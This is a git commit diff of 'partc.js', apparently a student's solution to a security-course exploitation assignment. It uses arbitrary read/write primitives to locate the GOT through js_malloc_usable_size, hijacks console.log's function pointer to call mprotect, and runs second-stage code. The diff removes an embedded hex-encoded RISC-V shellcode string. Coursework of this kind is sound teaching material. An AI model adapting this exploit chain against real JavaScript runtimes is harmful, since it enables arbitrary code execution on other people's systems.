56c08ddcbca8a3fa3d0ef67ac3d243f7f523bc95
Denis Ivanov <denis.ivanov26@gmail.com>
2022-04-12 23:50:21 -0500

    Update partc.js

--- proj5/partc.js
+++ proj5/partc.js
@@ -1,18 +1,12 @@
 /*
  * TODO: Part C solution goes here!
  */
-const second_stage = 
-    "\xb7\x92\x39\x34\x9b\x82\x72\x7b\xb2\x02\x93\x82\xb2\x34\xb6\x02"
-  + "\x93\x82\xf2\x22\x23\x3c\x51\xfe\x13\x05\x81\xff\x23\x38\x01\xfe"
-  + "\x13\x06\x01\xff\x23\x34\xa1\xfe\x93\x05\x81\xfe\x93\x02\xb0\x03"
-  + "\x73\x00\x00\x00";
 
 // ctx -> rt -> js malloc usable size
 const ctx = cs361s.readmem(cs361s.addrof(console.log) + 48);
 const rt = cs361s.readmem(ctx + 24);
 const jsMallocUsableSize = cs361s.readmem(rt + 24);
 const auipc = cs361s.readmem(jsMallocUsableSize) >>> 12 << 12; // 20 immediate bits
-console.log((auipc >>> 0).toString(2));
 const load = cs361s.readmem(jsMallocUsableSize + 4) >> 20; // 12 immediate bits
 //GOT = game of thrones :)
 const gameofthrones = cs361s.readmem(jsMallocUsableSize + auipc + load);
@@ -24,6 +18,7 @@ const addressconsole = cs361s.addrof(console.log);
 
 cs361s.writemem(addressconsole + 48, secondstageaddress);
 cs361s.writemem(addressconsole + 56, addressmprotect);
-console.log.apply(num, null); //change num to be x10 power of -320
+console.log.apply(num, null); 
 cs361s.writemem(addressconsole + 56, secondstageaddress + 16); 
+
 console.log();
